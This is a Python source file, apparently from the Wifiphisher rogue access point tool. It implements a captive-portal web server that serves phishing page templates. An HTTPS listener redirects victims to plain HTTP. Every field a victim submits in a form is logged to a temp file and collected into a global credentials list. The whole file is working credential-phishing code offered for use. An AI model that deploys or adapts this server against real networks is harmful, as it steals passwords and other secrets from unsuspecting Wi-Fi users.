#pylint: skip-file
import tornado.ioloop
import tornado.web
import os.path
import logging
hn = logging.NullHandler()
hn.setLevel(logging.DEBUG)
logging.getLogger('tornado.access').disabled = True
logging.getLogger('tornado.general').disabled = True
from wifiphisher.common.constants import *

template = False
terminate = False
creds = []


class DowngradeToHTTP(tornado.web.RequestHandler):

    def get(self, url):
        self.redirect("http://10.0.0.1:8080/")


class CaptivePortalHandler(tornado.web.RequestHandler):

    def get(self, url):
        client_request = self.request.path[1:]
        try:
            if self.request.path == "/":
                if os.path.exists(template.get_path() + "index.html"):
                    self.render("index.html", **template.get_context())
                else:
                    log_file.write('[' + R + '!' + W + '] ' + R + 
                        "Wifiphisher was unable to answer the request from " + T +
                               self.request.remote_ip + R + " for " + W + self.request.full_url() +
                               R + " (scenario is missing index.html)" + W + "\n")
            else:
                if os.path.exists(template.get_path() + client_request):
                    self.render(client_request, **template.get_context())
                else:
                    if os.path.exists(template.get_path() + "index.html"):
                        self.render("index.html", **template.get_context())
                    elif os.path.exists(template.get_path() + "index.htm"):
                        self.render("index.htm", **template.get_context())
            wifi_webserver_tmp = "/tmp/wifiphisher-webserver.tmp"
            with open(wifi_webserver_tmp, "a+") as log_file:
                log_file.write('[' + T + '*' + W + '] ' + O + "GET" + W + " request from " + T +
                               self.request.remote_ip + W + " for " + self.request.full_url() +
                               "\n")
                log_file.close()
        # Ignore weird requests
        except:
            pass

    def post(self, url):
        form_data = self.request.body.split('&')
        form_values = []
        for each_form_data in form_data:
            form_values.append(each_form_data.split('='))
        for input_name,input_value in form_values:
            with open("/tmp/wifiphisher-webserver.tmp", "a+") as log_file:
                log_file.write('[' + T + '*' + W + '] ' + O + "POST" + W + " request from " + T +
                               self.request.remote_ip + G + input_name + W + 
                               " : " + R + input_value + W + 
                               "\n")
                log_file.close()
        global terminate, creds
        for input_name,input_value in form_values:
            creds.insert(0, repr(input_name + " = " + input_value))
        terminate = True

        
def runHTTPServer(ip, port, ssl_port, t):
    global template
    template = t
    app = tornado.web.Application(
        [
            (r"/(.*)", CaptivePortalHandler)
        ],
        template_path=template.get_path(),
        static_path=template.get_path_static(),
        compiled_template_cache=False
    )
    app.listen(port, address=ip)

    ssl_app = tornado.web.Application(
        [
            (r"/(.*)", DowngradeToHTTP)
        ]
    )
    https_server = tornado.httpserver.HTTPServer(ssl_app, ssl_options={
        "certfile": PEM,
        "keyfile": PEM,
    })
    https_server.listen(ssl_port, address=ip)

    tornado.ioloop.IOLoop.instance().start()
